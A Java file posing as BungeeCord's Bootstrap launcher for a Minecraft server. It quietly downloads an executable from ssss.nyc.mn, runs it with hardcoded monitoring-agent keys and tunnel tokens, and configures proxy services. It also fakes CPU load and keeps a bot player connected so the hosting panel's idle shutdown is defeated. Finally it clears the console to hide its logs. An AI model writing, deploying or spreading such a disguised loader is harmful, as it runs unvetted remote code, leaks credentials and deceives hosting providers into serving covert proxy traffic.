package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.zip.Deflater; 
import java.util.zip.Inflater; 

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Thread fakePlayerThread;
    private static Thread cpuKeeperThread; // CPU 保活线程
    
    private static Process minecraftProcess;
    
    private static final int BUFFER_SIZE = 65536; 
    private static final byte[] SEND_BUFFER = new byte[BUFFER_SIZE]; 
    private static final byte[] READ_BUFFER = new byte[BUFFER_SIZE]; 
    private static final byte[] COMPRESS_BUFFER = new byte[BUFFER_SIZE];
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT", 
        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME"
    };

    public static void main(String[] args) throws Exception
    {
        Thread.currentThread().setPriority(Thread.MIN_PRIORITY);

        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) 
        {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        try {
            Map<String, String> config = loadEnvVars();
            
            runSbxBinary(config);
            
            // 启动 CPU 保活 (防止面板因 0% CPU 关机)
            startCpuKeeper();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "SBX Services are running!" + ANSI_RESET);
            
            if (isMcServerEnabled(config)) {
                startMinecraftServer(config);
                System.out.println(ANSI_YELLOW + "\n[MC-Server] Waiting for server to fully start..." + ANSI_RESET);
                Thread.sleep(35000);  
            }
            
            if (isFakePlayerEnabled(config)) {
                System.out.println(ANSI_YELLOW + "\n[FakePlayer] Preparing to connect..." + ANSI_RESET);
                waitForServerReady(config);
                startFakePlayerBot(config);
            }
            
            System.out.println(ANSI_GREEN + "\nThank you for using this script, Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();
        } catch (Exception e) {
            e.printStackTrace();
        }

        while (running.get()) {
            try {
                Thread.sleep(10000);
                System.gc(); 
            } catch (InterruptedException e) { break; }
        }
    }
    
    // ==========================================
    // [NEW] CPU 保活线程
    // 每秒进行少量数学运算，欺骗面板认为进程是活跃的
    // ==========================================
    private static void startCpuKeeper() {
        cpuKeeperThread = new Thread(() -> {
            while (running.get()) {
                try {
                    long result = 0;
                    // 进行 10ms 的密集运算
                    long start = System.currentTimeMillis();
                    while (System.currentTimeMillis() - start < 10) {
                        result += Math.sqrt(Math.random() * 10000);
                    }
                    // 休眠 990ms
                    Thread.sleep(990);
                } catch (InterruptedException e) { break; }
            }
        });
        cpuKeeperThread.setDaemon(true);
        cpuKeeperThread.start();
        System.out.println(ANSI_GREEN + "[System] Anti-Idle Protection Active" + ANSI_RESET);
    }
    
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {}
    }   
    
    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }
    
    private static Map<String, String> loadEnvVars() throws IOException {
        Map<String, String> envVars = new HashMap<>();
        
        envVars.put("UUID", "2559755b-a5d5-4483-bd4b-54e6b2442391");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "kingcs.svip888.us.kg");
        envVars.put("ARGO_AUTH", "eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiOGVkYWEzMzItOGI5Ny00NmM2LTk5Y2UtMWIxYWRmMzQ2NDg2IiwicyI6IlpXTTJNekF6TXpBdE16QXdaaTAwTUdReUxXSmtaVGt0TnpZek9HVTFaV0kzWW1ZMCJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "store.ubi.com");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Mc");
        envVars.put("DISABLE_ARGO", "false");
        
        envVars.put("MC_JAR", "server99.jar");
        envVars.put("MC_MEMORY", "512M");
        envVars.put("MC_ARGS", "");
        envVars.put("MC_PORT", "25897");
        envVars.put("FAKE_PLAYER_ENABLED", "true"); 
        envVars.put("FAKE_PLAYER_NAME", "laohu");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2 && Arrays.asList(ALL_ENV_VARS).contains(parts[0].trim())) {
                    envVars.put(parts[0].trim(), parts[1].trim().replaceAll("^['\"]|['\"]$", "")); 
                }
            }
        }
        return envVars;
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) throw new IOException("Failed to set executable permission");
        }
        return path;
    }
    
    private static void stopServices() {
        if (minecraftProcess != null && minecraftProcess.isAlive()) {
            System.out.println(ANSI_YELLOW + "[MC-Server] Stopping..." + ANSI_RESET);
            minecraftProcess.destroy();
        }
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
        }
    }
    
    private static boolean isMcServerEnabled(Map<String, String> config) {
        String jarName = config.get("MC_JAR");
        return jarName != null && !jarName.trim().isEmpty();
    }
    
    private static void startMinecraftServer(Map<String, String> config) throws Exception {
        String jarName = config.get("MC_JAR");
        String memory = config.getOrDefault("MC_MEMORY", "512M");
        String extraArgs = config.getOrDefault("MC_ARGS", "");
        
        String mcPortStr = config.get("MC_PORT");
        int mcPort = 25565;
        try { if (mcPortStr != null) mcPort = Integer.parseInt(mcPortStr.trim()); } catch (Exception e) {}
        config.put("MC_PORT", String.valueOf(mcPort));
        
        if (!memory.matches("\\d+[MG]")) memory = "512M";
        
        Path jarPath = Paths.get(jarName);
        if (!Files.exists(jarPath)) {
            System.out.println(ANSI_RED + "[MC-Server] Error: " + jarName + " not found!" + ANSI_RESET);
            return;
        }
        
        Path eulaPath = Paths.get("eula.txt");
        if (!Files.exists(eulaPath)) Files.write(eulaPath, "eula=true".getBytes());
        else if (!new String(Files.readAllBytes(eulaPath)).contains("eula=true")) Files.write(eulaPath, "eula=true".getBytes());
        
        Path propPath = Paths.get("server.properties");
        String props = Files.exists(propPath) ? new String(Files.readAllBytes(propPath)) : "server-port=" + mcPort + "\nonline-mode=false\n";
        props = props.replaceAll("player-idle-timeout=\\d+", "player-idle-timeout=0");
        if (!props.contains("player-idle-timeout=")) props += "player-idle-timeout=0\n";
        props = props.replaceAll("server-port=\\d+", "server-port=" + mcPort);
        if (!props.contains("server-port=")) props += "\nserver-port=" + mcPort + "\n";
        if (props.contains("online-mode=true")) props = props.replace("online-mode=true", "online-mode=false");
        else if (!props.contains("online-mode=")) props += "online-mode=false\n";
        Files.write(propPath, props.getBytes());
        
        System.out.println(ANSI_GREEN + "\n=== Starting Minecraft Server ===" + ANSI_RESET);
        
        List<String> cmd = new ArrayList<>();
        cmd.add("java");
        cmd.add("-Xms" + memory);
        cmd.add("-Xmx" + memory);
        if (!extraArgs.trim().isEmpty()) cmd.addAll(Arrays.asList(extraArgs.split("\\s+")));
        
        cmd.add("-XX:+UseG1GC");
        cmd.add("-XX:+DisableExplicitGC");
        
        cmd.add("-jar");
        cmd.add(jarName);
        cmd.add("nogui");
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        minecraftProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(minecraftProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) System.out.println("[MC-Server] " + line);
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(3000);
    }
    
    private static int parseMemory(String memory) {
        try {
            memory = memory.toUpperCase().trim();
            if (memory.endsWith("G")) return Integer.parseInt(memory.substring(0, memory.length() - 1)) * 1024;
            else if (memory.endsWith("M")) return Integer.parseInt(memory.substring(0, memory.length() - 1));
        } catch (Exception e) {}
        return 512;
    }
    
    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        String enabled = config.get("FAKE_PLAYER_ENABLED");
        return enabled != null && enabled.equalsIgnoreCase("true");
    }
    
    private static void waitForServerReady(Map<String, String> config) throws InterruptedException {
        int mcPort = getMcPort(config);
        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking server status..." + ANSI_RESET);
        for (int i = 0; i < 60; i++) {
            try {
                Thread.sleep(5000);
                try (Socket testSocket = new Socket()) {
                    testSocket.connect(new InetSocketAddress("127.0.0.1", mcPort), 3000);
                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Server ready!" + ANSI_RESET);
                    Thread.sleep(5000);
                    return;
                }
            } catch (Exception e) {}
        }
    }
    
    private static int getMcPort(Map<String, String> config) {
        try { return Integer.parseInt(config.getOrDefault("MC_PORT", "25565").trim()); } 
        catch (Exception e) { return 25565; }
    }
    
    private static void startFakePlayerBot(Map<String, String> config) {
        String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
        int mcPort = getMcPort(config);
        
        fakePlayerThread = new Thread(() -> {
            while (running.get()) {
                Socket socket = null;
                try {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Connecting..." + ANSI_RESET);
                    socket = new Socket();
                    socket.setReceiveBufferSize(32768); 
                    socket.setSendBufferSize(4096); 
                    socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                    socket.setSoTimeout(40000); 
                    
                    DataOutputStream out = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));
                    DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));

                    sendHandshake(out, mcPort);
                    sendLogin(out, playerName);
                    out.flush(); 
                    
                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Handshake & Login sent" + ANSI_RESET);
                    
                    boolean configPhase = false;
                    boolean playPhase = false;
                    boolean compressionEnabled = false;
                    int compressionThreshold = -1;
                    
                    // 记录在线开始时间
                    long sessionStartTime = System.currentTimeMillis();
                    // 随机在线 60 到 120 秒后主动重连
                    long sessionDuration = 60000 + (long)(Math.random() * 60000);

                    Deflater deflater = new Deflater();
                    Inflater inflater = new Inflater();

                    while (running.get() && !socket.isClosed()) {
                        // [NEW] 周期性重连逻辑：时间到了就主动断开
                        if (playPhase && (System.currentTimeMillis() - sessionStartTime > sessionDuration)) {
                            System.out.println(ANSI_YELLOW + "[FakePlayer] Cycling session (Anti-Idle)..." + ANSI_RESET);
                            break; // 跳出循环，触发重连
                        }

                        try {
                            int packetLength = readVarInt(in);
                            if (packetLength < 0 || packetLength > 100000000) throw new IOException("Bad packet");
                            
                            byte[] packetData = null;
                            if (compressionEnabled) {
                                int dataLength = readVarInt(in);
                                int compressedLength = packetLength - getVarIntSize(dataLength);
                                
                                // 大包直接跳过，防止解压消耗内存
                                if (dataLength == 0) {
                                    if (compressedLength > READ_BUFFER.length) { skipFully(in, compressedLength); continue; }
                                    in.readFully(READ_BUFFER, 0, compressedLength);
                                } else {
                                    if (dataLength > 65536) { skipFully(in, compressedLength); continue; } 
                                    in.readFully(COMPRESS_BUFFER, 0, compressedLength);
                                    try {
                                        inflater.reset();
                                        inflater.setInput(COMPRESS_BUFFER, 0, compressedLength);
                                        inflater.inflate(READ_BUFFER, 0, dataLength);
                                    } catch (Exception e) { continue; }
                                }
                            } else {
                                if (packetLength > READ_BUFFER.length) { skipFully(in, packetLength); continue; }
                                in.readFully(READ_BUFFER, 0, packetLength);
                            }
                            
                            int packetId = 0;
                            int ptr = 0;
                            int result = 0;
                            int shift = 0;
                            byte b;
                            do {
                                b = READ_BUFFER[ptr++];
                                result |= (b & 0x7F) << shift;
                                shift += 7;
                            } while ((b & 0x80) != 0);
                            packetId = result;
                            
                            ByteArrayInputStream packetStream = new ByteArrayInputStream(READ_BUFFER, ptr, READ_BUFFER.length - ptr);
                            DataInputStream packetIn = new DataInputStream(packetStream);

                            if (!playPhase) {
                                if (!configPhase) { // Login
                                    if (packetId == 0x03) { 
                                        compressionThreshold = readVarInt(packetIn);
                                        compressionEnabled = compressionThreshold >= 0;
                                        System.out.println(ANSI_YELLOW + "[FakePlayer] Compression: " + compressionThreshold + ANSI_RESET);
                                    } else if (packetId == 0x02) { 
                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Login Success" + ANSI_RESET);
                                        sendAck(out, deflater, compressionEnabled, compressionThreshold);
                                        configPhase = true;
                                        sendClientSettings(out, deflater, compressionEnabled, compressionThreshold);
                                    }
                                } else { // Config
                                    if (packetId == 0x03) { 
                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Config Finished" + ANSI_RESET);
                                        sendAck(out, deflater, compressionEnabled, compressionThreshold);
                                        playPhase = true; 
                                        sessionStartTime = System.currentTimeMillis(); // 重置计时
                                    } else if (packetId == 0x04) { 
                                        long id = packetIn.readLong();
                                        sendKeepAlive(out, deflater, id, 0x04, compressionEnabled, compressionThreshold);
                                    } else if (packetId == 0x0E) { 
                                        sendKnownPacks(out, deflater, compressionEnabled, compressionThreshold);
                                    }
                                }
                            } else { // Play
                                // 心跳回复 (ID 范围宽泛匹配)
                                if (packetId >= 0x1F && packetId <= 0x28 && packetIn.available() == 8) { 
                                    long keepAliveId = packetIn.readLong();
                                    // 1.21.2+ Serverbound KeepAlive ID = 0x18
                                    sendKeepAlive(out, deflater, keepAliveId, 0x18, compressionEnabled, compressionThreshold);
                                    System.out.println(ANSI_GREEN + "[FakePlayer] Ping" + ANSI_RESET);
                                }
                            }
                        } catch (Exception e) { break; }
                    }
                    if (socket != null) socket.close();
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting cycle..." + ANSI_RESET);
                    
                    // 重连前等待 10 秒
                    Thread.sleep(10000);
                    
                } catch (Exception e) {
                    try { Thread.sleep(10000); } catch (InterruptedException ex) { break; }
                }
            }
        });
        fakePlayerThread.setDaemon(true);
        fakePlayerThread.start();
    }
    
    private static synchronized void sendPacketRaw(DataOutputStream out, Deflater deflater, byte[] data, int len, boolean compress, int threshold) throws IOException {
        if (!compress || len < threshold) {
            if (compress) {
                int totalLen = 1 + len; 
                writeVarInt(out, totalLen);
                out.writeByte(0); 
                out.write(data, 0, len);
            } else {
                writeVarInt(out, len);
                out.write(data, 0, len);
            }
        } else {
            deflater.reset();
            deflater.setInput(data, 0, len);
            deflater.finish();
            int compressedLen = deflater.deflate(COMPRESS_BUFFER);
            int dataLenSize = getVarIntSize(len);
            int totalLen = dataLenSize + compressedLen;
            writeVarInt(out, totalLen);
            writeVarInt(out, len); 
            out.write(COMPRESS_BUFFER, 0, compressedLen);
        }
        out.flush();
    }
    
    private static void sendKeepAlive(DataOutputStream out, Deflater deflater, long id, int packetId, boolean compress, int threshold) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream bufOut = new DataOutputStream(buf);
        writeVarInt(bufOut, packetId);
        bufOut.writeLong(id);
        sendPacket(out, deflater, buf.toByteArray(), compress, threshold);
    }
    
    private static void sendAck(DataOutputStream out, Deflater deflater, boolean compress, int threshold) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream bufOut = new DataOutputStream(buf);
        writeVarInt(bufOut, 0x03);
        sendPacket(out, deflater, buf.toByteArray(), compress, threshold);
    }
    
    private static void sendKnownPacks(DataOutputStream out, Deflater deflater, boolean compress, int threshold) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream bufOut = new DataOutputStream(buf);
        writeVarInt(bufOut, 0x07);
        writeVarInt(bufOut, 0);
        sendPacket(out, deflater, buf.toByteArray(), compress, threshold);
    }
    
    private static void sendClientSettings(DataOutputStream out, Deflater deflater, boolean compress, int threshold) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream bufOut = new DataOutputStream(buf);
        writeVarInt(bufOut, 0x00); 
        writeString(bufOut, "en_US"); 
        bufOut.writeByte(10); 
        writeVarInt(bufOut, 0); 
        bufOut.writeBoolean(true); 
        bufOut.writeByte(127); 
        writeVarInt(bufOut, 1); 
        bufOut.writeBoolean(false); 
        bufOut.writeBoolean(true);
        writeVarInt(bufOut, 0); 

        sendPacket(out, deflater, buf.toByteArray(), compress, threshold);
    }
    
    private static void sendHandshake(DataOutputStream out, int port) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream bufOut = new DataOutputStream(buf);
        writeVarInt(bufOut, 0x00);
        writeVarInt(bufOut, 774); 
        writeString(bufOut, "127.0.0.1");
        bufOut.writeShort(port);
        writeVarInt(bufOut, 2); 
        byte[] b = buf.toByteArray();
        writeVarInt(out, b.length);
        out.write(b);
    }
    
    private static void sendLogin(DataOutputStream out, String name) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream bufOut = new DataOutputStream(buf);
        writeVarInt(bufOut, 0x00);
        writeString(bufOut, name);
        UUID uuid = UUID.nameUUIDFromBytes(("OfflinePlayer:" + name).getBytes("UTF-8"));
        bufOut.writeLong(uuid.getMostSignificantBits());
        bufOut.writeLong(uuid.getLeastSignificantBits());
        byte[] b = buf.toByteArray();
        writeVarInt(out, b.length);
        out.write(b);
    }

    private static void skipFully(DataInputStream in, int n) throws IOException {
        int total = 0;
        while (total < n) {
            int skipped = in.skipBytes(n - total);
            if (skipped == 0) {
                if (in.read() == -1) throw new EOFException();
                total++;
            } else {
                total += skipped;
            }
        }
    }
    
    private static int getVarIntSize(int value) {
        int size = 0;
        do {
            size++;
            value >>>= 7;
        } while (value != 0);
        return size;
    }
    
    private static void sendPacket(DataOutputStream out, Deflater deflater, byte[] packet, boolean compress, int threshold) throws IOException {
        sendPacketRaw(out, deflater, packet, packet.length, compress, threshold);
    }
    
    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value & 0x7F);
    }
    
    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] bytes = str.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }
    
    private static int readVarInt(DataInputStream in) throws IOException {
        int value = 0;
        int length = 0;
        byte currentByte;
        do {
            currentByte = in.readByte();
            value |= (currentByte & 0x7F) << (length * 7);
            length++;
            if (length > 5) throw new IOException("VarInt too big");
        } while ((currentByte & 0x80) == 0x80);
        return value;
    }
}
